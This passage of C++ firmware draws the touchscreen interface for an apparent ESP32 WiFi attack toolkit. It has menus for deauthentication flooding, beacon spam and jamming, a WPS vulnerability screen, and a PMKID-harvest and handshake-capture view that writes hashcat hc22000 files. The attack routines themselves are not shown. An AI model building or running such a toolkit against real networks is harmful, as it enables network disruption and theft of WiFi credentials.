    PACKETLABMenuBtns[8] = {zoneLeft,               row5Y, btnW, btnH, "SET TARGET"};
    PACKETLABMenuBtns[9] = {zoneLeft + btnW + gapX, row5Y, btnW, btnH, PACKETLABIsAttacking() ? "STOP" : "BACK"};

    const uint16_t edgeCols[10] = {
      0xFD20, 0x07FF, TFT_GREEN, TFT_RED, TFT_MAGENTA, 0x07FF, TFT_GREEN, 0xFD20, TFT_CYAN, TFT_CYAN
    };

    for (int i = 0; i < 10; ++i) {
      const Button& b = PACKETLABMenuBtns[i];
      neonPanelCyd(b.x, b.y, b.w, b.h, cydWide ? 7 : 5, edgeCols[i], edgeCols[i]);
      const int iconSize = min(cydWide ? 28 : 16, b.h - 6);
      const int iconX = b.x + 5;
      const int iconY = b.y + (b.h - iconSize) / 2;
      drawCardIconCyd(i, iconX, iconY, iconSize, edgeCols[i]);
      tft.setTextDatum(TL_DATUM);
      if (cydWide) applyFontMd(); else applyFontSm();
      tft.setTextColor((i == 5) ? TFT_WHITE : edgeCols[i], TFT_BLACK);
      tft.drawString(b.label, b.x + iconSize + 10, b.y + (b.h / 2) - (cydWide ? 9 : 6));
    }

    if (!cydWide) {
      drawBorder();
      return;
    }

    const int metricsY = gridBottom + 6;
    neonPanelCyd(zoneLeft, metricsY, zoneW, metricsH, 7, TFT_MAGENTA, 0x780F);
    applyFontSm();
    tft.setTextDatum(TL_DATUM);
    const int infoW = zoneW / 5;
    const int sig = hasTarget ? target.rssi : WiFi.RSSI();
    const uint32_t secs = millis() / 1000U;
    const uint32_t hh = secs / 3600U;
    const uint32_t mm = (secs % 3600U) / 60U;
    const uint32_t ss = secs % 60U;
    char up[20];
    snprintf(up, sizeof(up), "%02lu:%02lu:%02lu", (unsigned long)hh, (unsigned long)mm, (unsigned long)ss);
    char rssiBuf[20];
    snprintf(rssiBuf, sizeof(rssiBuf), "%d", sig);
    char cbuf[12];
    snprintf(cbuf, sizeof(cbuf), "%u", (unsigned)jammitClientCount);

    tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("IF", zoneLeft + 5, metricsY + 4);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("wlan0", zoneLeft + 5, metricsY + 20);
    tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("SIG", zoneLeft + infoW + 5, metricsY + 4);
    drawSignalGlyphCyd(zoneLeft + infoW + 4, metricsY + 20, 16, 18, TFT_GREEN);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(rssiBuf, zoneLeft + infoW + 23, metricsY + 20);
    tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("CLI", zoneLeft + (2 * infoW) + 5, metricsY + 4);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(cbuf, zoneLeft + (2 * infoW) + 5, metricsY + 20);
    tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("UP", zoneLeft + (3 * infoW) + 5, metricsY + 4);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(up, zoneLeft + (3 * infoW) + 5, metricsY + 20);
    tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("MOD", zoneLeft + (4 * infoW) + 5, metricsY + 4);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "READY", zoneLeft + (4 * infoW) + 5, metricsY + 20);

    const int engY = metricsY + metricsH + 6;
    neonPanelCyd(zoneLeft, engY, zoneW, engineH, 7, TFT_MAGENTA, TFT_DARKGREY);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("ENGINE", zoneLeft + 6, engY + 3);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "READY", zoneLeft + 6, engY + 18);
    const int barX = zoneLeft + 110;
    const int barW = max(60, zoneW - 120);
    tft.fillRect(barX, engY + 17, barW, 10, 0x2104);
    const int fillW = PACKETLABIsAttacking() ? barW : (barW * 9 / 10);
    tft.fillRect(barX, engY + 17, fillW, 10, 0x07FF);

    drawBorder();
    return;
  }
#endif

  const bool compact = (h <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int safeLeft = uiActionDockSafeLeft();

  // Keep all PACKETLAB UI at least 5px away from the ActionDock safety band.
  const int zoneLeft = content.x;
  const int zoneRight = min(content.x + content.w, safeLeft - 1);
  const int zoneW = max(120, zoneRight - zoneLeft);

  // Status text block.
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  const int statusY = content.y + 2;
  const int statusH = PACKETLABIsAttacking() ? 24 : 12;
  const int statusTextW = max(60, zoneW - 6);
  auto drawStatusLine = [&](const char* raw, int x, int y, uint16_t color) {
    String s = raw ? raw : "";
    while (s.length() > 1 && tft.textWidth(s) > statusTextW) {
      s.remove(s.length() - 1);
    }
    if (raw && strlen(raw) > s.length() && s.length() > 3) {
      s.remove(s.length() - 3);
      s += "...";
    }
    tft.setTextColor(color, TFT_BLACK);
    tft.drawString(s, x, y);
  };

  tft.fillRect(zoneLeft, statusY, zoneW, statusH + 2, TFT_BLACK);
  tft.drawRect(zoneLeft, statusY, zoneW, statusH + 2, TFT_DARKGREY);

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (PACKETLABHasSelectedTarget) {
    if (PACKETLABTargetSsid[0] == '\0') {
      drawStatusLine("Target: ALL APs", zoneLeft + 3, statusY + 1, TFT_CYAN);
    } else {
      char buf[56];
      snprintf(buf, sizeof(buf), "Target: %.20s [CH%d]", PACKETLABTargetSsid, PACKETLABTargetChannel);
      drawStatusLine(buf, zoneLeft + 3, statusY + 1, TFT_CYAN);
    }
  } else {
    drawStatusLine("NO TARGET // SELECT AP TO ARM", zoneLeft + 3, statusY + 1, TFT_RED);
  }

  if (PACKETLABIsAttacking()) {
    drawStatusLine(PACKETLABGetAttackName(), zoneLeft + 3, statusY + 13, TFT_YELLOW);
  }

  // 5x2 grid: attacks (rows 1-2) + tools (rows 3-4) + target/nav (row 5).
  const int cols = 2;
  const int rows = 5;
  const int gapX = compact ? 4 : 8;
  const int gapY = compact ? 3 : 6;
  int gridTop = statusY + statusH + (compact ? 5 : 7);
  // Avoid global top-button render offset that would shift only the first row and cause overlap.
  if (gridTop <= UI_TOP_BUTTON_SHIFT_THRESHOLD_Y) {
    gridTop = UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 1;
  }
  const int gridBottom = bottom.y - 2;
  const int gridH = max(80, gridBottom - gridTop);
  const int btnW = max(52, (zoneW - gapX) / cols);
  const int btnH = max(16, (gridH - (gapY * (rows - 1))) / rows);
  const int row1Y = gridTop;
  const int row2Y = row1Y + btnH + gapY;
  const int row3Y = row2Y + btnH + gapY;
  const int row4Y = row3Y + btnH + gapY;
  const int row5Y = row4Y + btnH + gapY;

  // Attack buttons (rows 1-2)
  PACKETLABMenuBtns[0] = {zoneLeft,               row1Y, btnW, btnH, "Deauth Flood"};
  PACKETLABMenuBtns[1] = {zoneLeft + btnW + gapX, row1Y, btnW, btnH, "Beacon Spam"};
  PACKETLABMenuBtns[2] = {zoneLeft,               row2Y, btnW, btnH, "Probe Flood"};
  PACKETLABMenuBtns[3] = {zoneLeft + btnW + gapX, row2Y, btnW, btnH, "Deauth All"};
  // Row 3: PUSH!T | SP3CTER
  PACKETLABMenuBtns[4] = {zoneLeft,               row3Y, btnW, btnH, "PUSH!T"};
  PACKETLABMenuBtns[5] = {zoneLeft + btnW + gapX, row3Y, btnW, btnH, "SP3CTER"};
  // Row 4: Y0INK | JAMM!T
  PACKETLABMenuBtns[6] = {zoneLeft,               row4Y, btnW, btnH, "Y0INK"};
  PACKETLABMenuBtns[7] = {zoneLeft + btnW + gapX, row4Y, btnW, btnH, "JAMM!T"};
  // Row 5: Set Target | Back/Stop
  PACKETLABMenuBtns[8] = {zoneLeft,               row5Y, btnW, btnH, "Set Target"};
  PACKETLABMenuBtns[9] = {zoneLeft + btnW + gapX, row5Y, btnW, btnH,
                      PACKETLABIsAttacking() ? "STOP" : "Back"};

  drawButton(PACKETLABMenuBtns[0], TFT_BLACK, 0xFF07,      TFT_WHITE);
  drawButton(PACKETLABMenuBtns[1], TFT_BLACK, 0xFF07,      TFT_WHITE);
  drawButton(PACKETLABMenuBtns[2], TFT_BLACK, 0xFF07,      TFT_WHITE);
  drawButton(PACKETLABMenuBtns[3], TFT_BLACK, 0xF800,      TFT_WHITE);
  drawButton(PACKETLABMenuBtns[4], TFT_BLACK, TFT_MAGENTA, TFT_WHITE);
  drawButton(PACKETLABMenuBtns[5], TFT_BLACK, 0x07FF,      TFT_WHITE);  // cyan - SP3CTER
  drawButton(PACKETLABMenuBtns[6], TFT_BLACK, TFT_DARKGREEN, TFT_WHITE);
  drawButton(PACKETLABMenuBtns[7], TFT_BLACK, TFT_RED, TFT_WHITE);
  drawButton(PACKETLABMenuBtns[8], TFT_BLACK, TFT_NAVY, TFT_WHITE);
  drawButton(PACKETLABMenuBtns[9], TFT_BLACK,
             PACKETLABIsAttacking() ? 0xFC00 : 0x07E0, TFT_WHITE);

  drawBorder();
}


// ============================================================
//  PUSH!T standalone screen
// ============================================================

static void drawPush1t() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PUSH!T // WPS INTEL");
  drawUniversalBackground();

  const UiRect content = computeContentRect();
  const UiRect bottom  = computeBottomBarRect();
  const int safeLeft   = uiActionDockSafeLeft();

  // Split content into left panel (stats/status) and right panel (controls)
  const int gap    = 4;
  const int rightW = min(120, content.w * 2 / 5);
  const int leftW  = max(100, min(safeLeft, content.x + content.w) - content.x - rightW - gap);
  const int leftX  = content.x;
  const int rightX = leftX + leftW + gap;
  const int y0     = content.y + 2;

  // ── Target card ──────────────────────────────────────────────────────────
  const int tgtH = 52;
  tft.drawRoundRect(leftX, y0, leftW, tgtH, 4, TFT_MAGENTA);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("TARGET", leftX + 4, y0 + 2);
  if (hasTarget) {
    String ssid = target.ssid.isEmpty() ? String("(hidden)") : target.ssid;
    while (ssid.length() > 4 && tft.textWidth(ssid) > leftW - 8) ssid.remove(ssid.length() - 1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(ssid, leftX + 4, y0 + 13);
    char row1[40];
    snprintf(row1, sizeof(row1), "%s  CH:%d  %ddBm", authToStr(target.auth), target.channel, target.rssi);
    String r1 = row1;
    while (r1.length() > 4 && tft.textWidth(r1) > leftW - 8) r1.remove(r1.length() - 1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString(r1, leftX + 4, y0 + 24);
    String bssid = target.bssid;
    while (bssid.length() > 4 && tft.textWidth(bssid) > leftW - 8) bssid.remove(bssid.length() - 1);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString(bssid, leftX + 4, y0 + 38);
  } else {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("No target — press SET TGT", leftX + 4, y0 + 22);
  }

  // ── WPS hero status box ───────────────────────────────────────────────────
  const int heroY = y0 + tgtH + gap;
  const int heroH = 44;
  uint16_t heroCol;
  const char* heroText;
  const char* heroSubText;
  if (!push1tWpsDetected) {
    heroCol  = TFT_DARKGREY;
    heroText = "NO WPS DETECTED";
    heroSubText = "Listening for beacons...";
  } else if (push1tVulnerable) {
    heroCol  = TFT_RED;
    heroText = "!! VULNERABLE !!";
    heroSubText = "WPS 1.0 - AP Setup Unlocked";
  } else if (push1tWpsLocked) {
    heroCol  = TFT_ORANGE;
    heroText = "WPS LOCKED";
    heroSubText = "AP Setup Lock active";
  } else {
    heroCol  = TFT_MAGENTA;
    heroText = "WPS DETECTED";
    heroSubText = push1tWpsVersion == 0x20 ? "WPS 2.0 - Lower risk" : "WPS present";
  }
  tft.fillRoundRect(leftX, heroY, leftW, heroH, 4, heroCol);
  tft.setTextColor(TFT_BLACK, heroCol);
  tft.setTextDatum(MC_DATUM);
  tft.drawString(heroText,    leftX + leftW / 2, heroY + 14);
  applyFontSm();
  tft.setTextColor(TFT_BLACK, heroCol);
  tft.drawString(heroSubText, leftX + leftW / 2, heroY + 28);
  tft.setTextDatum(TL_DATUM);

  // ── WPS detail rows ───────────────────────────────────────────────────────
  const int detY  = heroY + heroH + gap;
  const int detLH = 10;
  applyFontSm();

  auto detRow = [&](int dy, const char* label, const char* val, uint16_t col) {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString(label, leftX + 2, dy);
    String v = val;
    while (v.length() > 1 && tft.textWidth(v) > leftW - 60) v.remove(v.length() - 1);
    tft.setTextColor(col, TFT_BLACK);
    tft.drawString(v, leftX + 56, dy);
  };

  char verBuf[12], mfrBuf[26], devBuf[26];
  if      (!push1tWpsDetected)       snprintf(verBuf, sizeof(verBuf), "--");
  else if (push1tWpsVersion == 0x20) snprintf(verBuf, sizeof(verBuf), "2.0");
  else if (push1tWpsVersion == 0x10) snprintf(verBuf, sizeof(verBuf), "1.0");
  else                               snprintf(verBuf, sizeof(verBuf), "0x%02X", push1tWpsVersion);
  snprintf(mfrBuf, sizeof(mfrBuf), "%s", push1tManufacturer[0] ? push1tManufacturer : "--");
  snprintf(devBuf, sizeof(devBuf), "%s", push1tDeviceName[0]   ? push1tDeviceName   : "--");

  detRow(detY + detLH * 0, "WPS Ver:", verBuf,
         push1tWpsVersion == 0x10 ? TFT_RED : (push1tWpsDetected ? TFT_YELLOW : TFT_DARKGREY));
  detRow(detY + detLH * 1, "Locked: ", push1tWpsDetected ? (push1tWpsLocked ? "YES" : "NO") : "--",
         push1tWpsLocked ? TFT_ORANGE : (push1tWpsDetected ? TFT_GREEN : TFT_DARKGREY));
  detRow(detY + detLH * 2, "Mfr:    ", mfrBuf, TFT_CYAN);
  detRow(detY + detLH * 3, "Device: ", devBuf, TFT_CYAN);

  // ── Probe stats ───────────────────────────────────────────────────────────
  const int statY = detY + detLH * 4 + 3;
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  char probeBuf[48];
  if (autoMode == AutoMode::PUSH1T) {
    const uint32_t elapsed = (millis() - push1tLastProbeMs);
    snprintf(probeBuf, sizeof(probeBuf), "Probes: %lu  Last: %lus ago",
             (unsigned long)push1tProbeCount, (unsigned long)(elapsed / 1000));
  } else if (push1tProbeCount > 0) {
    snprintf(probeBuf, sizeof(probeBuf), "Probes: %lu  (stopped)", (unsigned long)push1tProbeCount);
  } else {
    snprintf(probeBuf, sizeof(probeBuf), "Probes: 0  (idle)");
  }
  String ps = probeBuf;
  while (ps.length() > 4 && tft.textWidth(ps) > leftW - 4) ps.remove(ps.length() - 1);
  tft.drawString(ps, leftX + 2, statY);

  // ── Right-side control stack ─────────────────────────────────────────────
  const int ctrlGap = gap;
  const int ctrlH   = 30;
  const int nBtns   = 4;
  const int totalCtrlH = nBtns * ctrlH + (nBtns - 1) * ctrlGap;
  const int ctrlTop = y0 + (content.h - totalCtrlH) / 2;

  const bool engaged = (autoMode == AutoMode::PUSH1T);
  btnP1tEngage    = {rightX, ctrlTop + 0*(ctrlH+ctrlGap), rightW, ctrlH, engaged ? "STOP" : "ENGAGE"};
  btnP1tManual    = {rightX, ctrlTop + 1*(ctrlH+ctrlGap), rightW, ctrlH, "PROBE NOW"};
  btnP1tSetTarget = {rightX, ctrlTop + 2*(ctrlH+ctrlGap), rightW, ctrlH, "SET TGT"};
  btnP1tPACKETLAB     = {rightX, ctrlTop + 3*(ctrlH+ctrlGap), rightW, ctrlH, "Pkt Lab"};

  drawButton(btnP1tEngage,    engaged ? TFT_MAROON    : TFT_DARKGREEN, TFT_RED,     TFT_WHITE);
  drawButton(btnP1tManual,    TFT_BLACK,               TFT_MAGENTA,    TFT_WHITE);
  drawButton(btnP1tSetTarget, TFT_NAVY,                TFT_CYAN,       TFT_WHITE);
  drawButton(btnP1tPACKETLAB,     TFT_BLACK,               0xFF07,         TFT_WHITE);

  // ── Bottom bar ────────────────────────────────────────────────────────────
  btnP1tBack = {bottom.x, bottom.y, bottom.w, bottom.h, "Back"};
  drawButton(btnP1tBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);

  // Stable render signature
  uint32_t sig = 2166136261u;
  auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
  mix((uint32_t)push1tWpsDetected);
  mix((uint32_t)push1tVulnerable);
  mix((uint32_t)push1tWpsLocked);
  mix((uint32_t)push1tWpsVersion);
  mix((uint32_t)(push1tProbeCount & 0xFF));
  mix((uint32_t)autoMode);
  mix((uint32_t)hasTarget);
  push1tScreenLastSig = sig;

  drawBorder();
}

// Touch handler for PUSH1T screen
static void push1tScreenTick_UI(int tx, int ty) {
  if (screen != ScreenId::PUSH1T_SCREEN) return;

  if (hit(btnP1tBack, tx, ty)) {
    if (autoMode == AutoMode::PUSH1T) disengageAutoMode();
    setScreen(ScreenId::HOME);
    waitTouchRelease();
    return;
  }
  if (hit(btnP1tEngage, tx, ty)) {
    if (autoMode == AutoMode::PUSH1T) {
      disengageAutoMode();
    } else if (hasTarget) {
      engageAutoMode(AutoMode::PUSH1T);
    } else {
      Serial.println("[PUSH1T] No target selected");
    }
    drawPush1t();
    waitTouchRelease();
    return;
  }
  if (hit(btnP1tManual, tx, ty)) {
    // Fire one probe immediately, regardless of engage state
    push1tSendProbeRequest();
    drawPush1t();
    waitTouchRelease();
    return;
  }
  if (hit(btnP1tSetTarget, tx, ty)) {
    setScreen(ScreenId::WIFI_SCAN);
    waitTouchRelease();
    return;
  }
  if (hit(btnP1tPACKETLAB, tx, ty)) {
    setScreen(ScreenId::PACKETLAB_MENU);
    waitTouchRelease();
    return;
  }
  waitTouchRelease();
}

// ============================================================
//  SP3CTER standalone screen
// ============================================================

static void drawSpecter() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("NEONDRIVE :: SP3CTER");
  drawUniversalBackground();

  const UiRect bottom  = computeBottomBarRect();
  const int    cY      = computeContentRect().y;  // top of content area
  const int    cH      = bottom.y - cY - 2;       // height of content area
  const int    mL      = UI_SAFE_MARGIN;           // left margin
  const int    mR      = UI_SAFE_MARGIN;           // right margin
  const int    scrW    = tft.width();
  const int    usable  = scrW - mL - mR;          // total usable width
  const int    colGap  = 5;

  // Three columns: Left (target + ghost) | Center (PMKID + log) | Right (clients + HS)
  const int lW = max(100, usable * 28 / 100);          // ~28%
  const int rW = max(90,  usable * 32 / 100);          // ~32%
  const int cW = usable - lW - rW - colGap * 2;        // remainder
  const int lX = mL;
  const int cX = lX + lW + colGap;
  const int rX = cX + cW + colGap;

  const bool engaged = (autoMode == AutoMode::SP3CTER);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();

  // ═══════════════════════════════════════════════════════════════
  //  LEFT COLUMN — Selected Target + Ghost Status + HC path
  // ═══════════════════════════════════════════════════════════════

  // ── Target card ──────────────────────────────────────────────
  const int tgtCardH = min(90, cH * 38 / 100);
  tft.drawRoundRect(lX, cY, lW, tgtCardH, 4, 0x07FF);  // cyan border
  tft.setTextColor(0x07FF, TFT_BLACK);
  tft.drawString("SELECTED TARGET", lX + 4, cY + 3);
  tft.drawFastHLine(lX + 1, cY + 12, lW - 2, 0x07FF);

  if (hasTarget) {
    String ssid = target.ssid.isEmpty() ? String("(hidden)") : target.ssid;
    while (ssid.length() > 4 && tft.textWidth(ssid.c_str()) > lW - 8)
      ssid.remove(ssid.length() - 1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(ssid.c_str(), lX + 4, cY + 15);

    // Lock icon if encrypted
    if (target.auth != WIFI_AUTH_OPEN) {
      tft.setTextColor(0x07E0, TFT_BLACK);
      tft.drawString("[ENC]", lX + lW - 32, cY + 15);
    }

    char bssidBuf[20];
    strncpy(bssidBuf, target.bssid.c_str(), 19);
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString(bssidBuf, lX + 4, cY + 27);

    char chRssi[24];
    snprintf(chRssi, sizeof(chRssi), "CH:%-3d  %d dBm", target.channel, target.rssi);
    tft.setTextColor(0x07FF, TFT_BLACK);
    tft.drawString(chRssi, lX + 4, cY + 39);

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(authToStr(target.auth), lX + 4, cY + 51);

    // Vendor / Auth short
    char secBuf[22];
    snprintf(secBuf, sizeof(secBuf), "RSSI: %d dBm", target.rssi);
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString(secBuf, lX + 4, cY + 63);

  } else {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("No target set", lX + 4, cY + 22);
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString("Press SET TGT below", lX + 4, cY + 34);
  }

  // ── Ghost Status panel ────────────────────────────────────────
  const int ghostY = cY + tgtCardH + 5;
  const int ghostH = min(58, cH * 24 / 100);
  tft.drawRoundRect(lX, ghostY, lW, ghostH, 3, 0xF81F);  // magenta border
  tft.setTextColor(0xF81F, TFT_BLACK);
  tft.drawString("GHOST TRIGGER", lX + 4, ghostY + 3);
  tft.drawFastHLine(lX + 1, ghostY + 12, lW - 2, 0xF81F);

  char ghostCtr[28];
  snprintf(ghostCtr, sizeof(ghostCtr), "Sent: %lu", (unsigned long)specterGhostCount);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(ghostCtr, lX + 4, ghostY + 16);

  const char* ghostStatus;
  uint16_t ghostStatusCol;
  if (!engaged) {
    ghostStatus = "IDLE (not engaged)";
    ghostStatusCol = 0x7BEF;
  } else if (specterGhostInFlight && !specterAssocSent) {
    ghostStatus = "FIRING: auth sent";
    ghostStatusCol = 0xF81F;
  } else if (specterGhostInFlight && specterAssocSent) {
    ghostStatus = "FIRING: assoc sent";
    ghostStatusCol = 0xF81F;
  } else {
    const uint32_t nextMs = 8000 - min(8000UL, (unsigned long)(millis() - specterLastGhostMs));
    char nbuf[28]; snprintf(nbuf, sizeof(nbuf), "Next in %lus", (unsigned long)(nextMs / 1000));
    ghostStatus = nbuf;
    ghostStatusCol = 0x07FF;
    tft.setTextColor(ghostStatusCol, TFT_BLACK);
    tft.drawString(ghostStatus, lX + 4, ghostY + 28);
    ghostStatus = nullptr;  // drawn inline above
  }
  if (ghostStatus) {
    tft.setTextColor(ghostStatusCol, TFT_BLACK);
    tft.drawString(ghostStatus, lX + 4, ghostY + 28);
  }

  // Fake STA MAC
  char fakeMAC[22];
  snprintf(fakeMAC, sizeof(fakeMAC), "%02x:%02x:%02x:%02x:%02x:%02x",
           specterFakeStaMac[0], specterFakeStaMac[1], specterFakeStaMac[2],
           specterFakeStaMac[3], specterFakeStaMac[4], specterFakeStaMac[5]);
  tft.setTextColor(0x7BEF, TFT_BLACK);
  tft.drawString(fakeMAC, lX + 4, ghostY + 40);

  // ── hc22000 status ───────────────────────────────────────────
  const int hcY = ghostY + ghostH + 5;
  if (specterPmkidCount > 0 && captureDir[0]) {
    tft.setTextColor(0x07E0, TFT_BLACK);
    tft.drawString("HC22000:", lX + 4, hcY);
    char hcPath[60];
    snprintf(hcPath, sizeof(hcPath), "%s/specter.hc", captureDir);
    String hcl = hcPath;
    while (hcl.length() > 4 && tft.textWidth(hcl.c_str()) > lW - 4)
      hcl.remove(hcl.length() - 1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(hcl.c_str(), lX + 4, hcY + 11);
    char frameBuf[24];
    snprintf(frameBuf, sizeof(frameBuf), "Frames: %u PMKIDs", specterPmkidCount);
    tft.setTextColor(0x07E0, TFT_BLACK);
    tft.drawString(frameBuf, lX + 4, hcY + 22);
  } else {
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString("No PMKIDs captured yet", lX + 4, hcY);
  }

  // ═══════════════════════════════════════════════════════════════
  //  CENTER COLUMN — PMKID Hero + Live Log
  // ═══════════════════════════════════════════════════════════════

  // ── PMKID harvest hero ────────────────────────────────────────
  const int heroSectionH = cH * 42 / 100;
  tft.drawRoundRect(cX, cY, cW, heroSectionH, 4, 0x07E0);  // green border
  tft.setTextColor(0x07E0, TFT_BLACK);
  tft.drawString("PMKID HARVEST", cX + 4, cY + 3);
  tft.drawFastHLine(cX + 1, cY + 12, cW - 2, 0x07E0);

  // Big PMKID count using font 6 (7-seg style)
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(6);
  applyFontSm();
  tft.setTextColor(specterPmkidCount > 0 ? 0x07E0 : 0x39C7, TFT_BLACK);
  char pmkBig[12];
  snprintf(pmkBig, sizeof(pmkBig), "%06lu", (unsigned long)specterPmkidCount);
  tft.drawString(pmkBig, cX + cW / 2, cY + 14 + 24);  // 24px = ~half font height
  tft.setTextFont(1);
  applyFontSm();
  tft.setTextColor(specterPmkidCount > 0 ? 0x07E0 : 0x7BEF, TFT_BLACK);
  tft.drawString("PMKIDs COLLECTED", cX + cW / 2, cY + 14 + 52);
  tft.setTextDatum(TL_DATUM);

  // First PMKID preview (if any)
  if (specterPmkidCount > 0) {
    const uint8_t* p0 = specterPmkids[0].pmkid;
    char prev[34];
    snprintf(prev, sizeof(prev), "%02x%02x%02x%02x%02x%02x%02x%02x...",
             p0[0],p0[1],p0[2],p0[3],p0[4],p0[5],p0[6],p0[7]);
    tft.setTextColor(0x07E0, TFT_BLACK);
    tft.drawString(prev, cX + 4, cY + 14 + 62);
  }

  // ── Live log ──────────────────────────────────────────────────
  const int logY = cY + heroSectionH + 5;
  const int logH = bottom.y - logY - 4;
  tft.drawRoundRect(cX, logY, cW, logH, 3, 0xFFE0);  // yellow border
  tft.setTextColor(0xFFE0, TFT_BLACK);
  tft.drawString("LIVE LOG", cX + 4, logY + 3);
  tft.drawFastHLine(cX + 1, logY + 12, cW - 2, 0xFFE0);

  // Draw log entries newest-first from the ring, oldest at bottom
  const int logLineH = 9;
  const int logLinesVisible = max(1, (logH - 15) / logLineH);
  const int logStart = logY + 15;
  // Iterate from newest to oldest, draw top-down
  const int logTotal = min((int)specterLogCount, logLinesVisible);
  for (int i = 0; i < logTotal; i++) {
    // Entry index (newest=0 means head-1, oldest=logTotal-1)
    int idx = ((int)specterLogHead - 1 - i + SPECTER_LOG_MAX) % SPECTER_LOG_MAX;
    tft.setTextColor(specterEventLog[idx].color, TFT_BLACK);
    // Clip text to column width
    String line = specterEventLog[idx].text;
    while (line.length() > 2 && tft.textWidth(line.c_str()) > cW - 6)
      line.remove(line.length() - 1);
    tft.drawString(line.c_str(), cX + 4, logStart + i * logLineH);
  }
  if (specterLogCount == 0) {
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString("Waiting for frames...", cX + 4, logStart);
  }

  // ═══════════════════════════════════════════════════════════════
  //  RIGHT COLUMN — Clients Seen + Handshake Completeness Table
  // ═══════════════════════════════════════════════════════════════

  const int clientSectionH = cH * 40 / 100;
  tft.drawRoundRect(rX, cY, rW, clientSectionH, 4, 0x07FF);  // cyan border
  char clientHdr[28];
  snprintf(clientHdr, sizeof(clientHdr), "CLIENTS SEEN   %u", specterClientCount);
  tft.setTextColor(0x07FF, TFT_BLACK);
  tft.drawString(clientHdr, rX + 4, cY + 3);
  tft.drawFastHLine(rX + 1, cY + 12, rW - 2, 0x07FF);

  // Client MAC list
  const int clRowH = 10;
  const int clVisible = max(1, (clientSectionH - 16) / clRowH);
  for (int i = 0; i < min((int)specterClientCount, clVisible); i++) {
    const uint8_t* m = specterClientMacs[i];
    char macBuf[22];
    snprintf(macBuf, sizeof(macBuf), "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0],m[1],m[2],m[3],m[4],m[5]);
    // Check if this client has a PMKID
    bool hasPmkid = false;
    for (uint8_t p = 0; p < specterPmkidCount; p++)
      if (memcmp(specterPmkids[p].staMac, m, 6) == 0) { hasPmkid = true; break; }
    tft.setTextColor(hasPmkid ? 0x07E0 : TFT_WHITE, TFT_BLACK);
    String ms = macBuf;
    while (ms.length() > 4 && tft.textWidth(ms.c_str()) > rW - 6) ms.remove(ms.length() - 1);
    tft.drawString(ms.c_str(), rX + 4, cY + 15 + i * clRowH);
  }
  if (specterClientCount == 0) {
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString("No clients yet", rX + 4, cY + 18);
  }

  // ── Handshake Completeness Table ─────────────────────────────
  const int hsY = cY + clientSectionH + 5;
  const int hsH = bottom.y - hsY - 4;
  tft.drawRoundRect(rX, hsY, rW, hsH, 3, 0xF800);  // red border (urgency)
  tft.setTextColor(0xFFE0, TFT_BLACK);
  tft.drawString("HS COMPLETENESS", rX + 4, hsY + 3);
  tft.drawFastHLine(rX + 1, hsY + 12, rW - 2, 0x7BEF);

  // Column header
  const int hsTblX  = rX + 4;
  const int hsTblY  = hsY + 15;
  const int hsColW  = (rW - 8) / 6;  // 6 cols: MAC short, M1 M2 M3 M4 P
  tft.setTextColor(0x7BEF, TFT_BLACK);
  tft.drawString("CLIENT", hsTblX,              hsTblY);
  tft.drawString("M1",     hsTblX + hsColW * 2, hsTblY);
  tft.drawString("M2",     hsTblX + hsColW * 3, hsTblY);
  tft.drawString("M3",     hsTblX + hsColW * 4, hsTblY);
  tft.drawString("M4",     hsTblX + hsColW * 5, hsTblY);

  const int hsRowH2   = 10;
  const int hsVisible = max(1, (hsH - 26) / hsRowH2);
  for (int i = 0; i < min((int)specterHsCount, hsVisible); i++) {
    const SpecterHsTrack& t = specterHsTracks[i];
    int ry = hsTblY + 10 + i * hsRowH2;
    char shortMac[10];
    snprintf(shortMac, sizeof(shortMac), "%02x:%02x", t.staMac[4], t.staMac[5]);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(shortMac, hsTblX, ry);

    auto indicator = [&](int xOff, bool v) {
